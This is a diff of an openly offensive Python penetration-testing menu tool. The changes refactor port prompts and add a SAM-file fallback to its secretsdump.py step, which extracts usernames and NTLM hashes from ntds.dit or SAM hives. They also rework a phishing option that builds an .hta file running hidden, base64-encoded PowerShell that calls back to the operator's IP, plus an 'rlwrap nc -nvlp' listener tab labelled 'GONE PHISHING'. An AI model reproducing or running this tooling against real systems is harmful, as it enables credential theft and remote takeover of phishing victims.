@@ -158,7 +158,7 @@ def getTime():
    return variable   
    
 def getPort():
-   num = input("[*] Please enter port number : ")
+   num = input("[*] Please enter the listening port number: ")
    if num.isdigit():
       return num
    else:
@@ -946,7 +946,7 @@ while True:
 
    if selection =='2':
       BAK = TIP
-      TIP = input("[*] Please enter REMOTE IP address: ")
+      TIP = input("[*] Please enter remote IP address: ")
       if TIP == "":
          TIP = BAK
       else:
@@ -1234,19 +1234,15 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
-      num = input("[*] Please specify listening port: ")
+      checkParams = getPort()
       
-      if num.isdigit():
-         print("[*] Starting HTTP server...")
-      
+      if checkParams != 1:
+         print("[*] Starting HTTP server...")      
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return"); time.sleep(1)
          command("xdotool type 'clear; cat " + dataDir + "/banner1.txt'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'python3 -m http.server " + num + "'; xdotool key Return"); time.sleep(1)
+         command("xdotool type 'python3 -m http.server --bind " + localIP + " " + checkParams + "'; xdotool key Return"); time.sleep(1)
          command("xdotool key Ctrl+Tab")      
-      else:
-         print("[-] Sorry, I did not understand " + num + "...")
-      
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2616,8 +2612,12 @@ while True:
       if os.path.exists("./" + workDir + "/ntds.dit"):
          print("[+] File ntds.dit found...")
       else:
-         print("[-] File ntds.dit not found...")
-         checkParams = 1         
+         print("[-] File ntds.dit not found, checking for SAM...")
+         if os.path.exists("./" + workDir + "/SAM"):
+            print("[+] File SAM found...")
+         else:
+            print("[-] File SAM not found...")
+            checkParams =1
          
       if os.path.exists("./" + workDir + "/SYSTEM"):
          print("[+] File SYSTEM found...")
@@ -2633,17 +2633,22 @@ while True:
          
       if checkParams != 1:
          print("[*] Extracting stored secrets, please wait...")
-         command(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
-         command("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
-         command("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")         
+         if os.path.exists("./" + workDir + "/SAM"):
+            command(keyPath + "secretsdump.py -sam ./" + workDir + "/SAM -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/sam-extract > log.tmp")      
+            command("cut -f1 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/usernames.txt")
+            command("cut -f4 -d':' ./" + workDir + "/sam-extract.sam > " + dataDir + "/hashes.txt")  
+         else:
+            command(keyPath + "secretsdump.py -ntds ./" + workDir + "/ntds.dit -system ./" + workDir +  "/SYSTEM -security ./" + workDir + "/SECURITY -hashes lmhash:nthash -pwd-last-set -history -user-status LOCAL -outputfile ./" + workDir +  "/ntlm-extract > log.tmp")      
+            command("cut -f1 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/usernames.txt")
+            command("cut -f4 -d':' ./" + workDir + "/ntlm-extract.ntds > " + dataDir + "/hashes.txt")  
+       
         
          print("[+] Importing extracted secrets...")        
          
          with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt", "r") as read2:
            for x in range (0, maxUser):
                USER[x] = read1.readline().rstrip("\n")
-               if USER[x] != "":
-                  USER[x] = spacePadding(USER[x], COL3)
+               USER[x] = spacePadding(USER[x], COL3)
                   
                HASH[x] = read2.readline().rstrip("\n")
                if USER[x] != "":
@@ -2805,16 +2810,22 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='74':    
-      num1 = input("[*] Please specify http server port: ")
-      num2 = input("[*] Please specify listening port  : ")
+   if selection =='74':
+      checkParams = getPort()
       
-      if (num1.isdigit()) and (num2.isdigit()):
-         print("[*] Creating .hta payload...")
-              
+      if checkParams != 1:
+         sPort = input("[*] Please specify http server port: ")
+
+         if sPort.isdigit():
+            print("[*] Creating .hta payload...")
+         else:
+            print("[-] Sorry, I did not understand " + sPort + "...")
+            checkParams = 1
+      
+      if checkParams != 1:             
          payLoad = f"""      
          a=new ActiveXObject("WScript.Shell");
-         a.run("powershell -nop -w 1 -enc {powershell(localIP, num2)}", 0);window.close();
+         a.run("powershell -nop -w 1 -enc {powershell(localIP, checkParams)}", 0);window.close();
          """.encode()
             
          bpayLoad = base64.b64encode(payLoad)
@@ -2823,16 +2834,14 @@ while True:
             hta.write(body(final))
          
          print("[+] Exploit created, utilise the following code snippet to activate...")
-         print(colored("\nhttp://" + localIP + ":" + num1 + "/payrise.hta",colour6))
+         print(colored("\nhttp://" + localIP + ":" + sPort + "/payrise.hta",colour6))
       
          print("\n[*] Starting phishing server...")      
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'GONE PHISHING'; xdotool key Return"); time.sleep(1)
          command("xdotool type 'clear; cat " + dataDir + "/banner4.txt'; xdotool key Return"); time.sleep(1)
-         command("xdotool type 'rlwrap nc -nvlp " + num2 + "'; xdotool key Return"); time.sleep(1)
-         command("xdotool key Ctrl+Tab")    
-      else:
-         print("[-] Sorry I did not understand...")
+         command("xdotool type 'rlwrap nc -nvlp " + checkParams + "'; xdotool key Return"); time.sleep(1)
+         command("xdotool key Ctrl+Tab")
           
       prompt()      
       
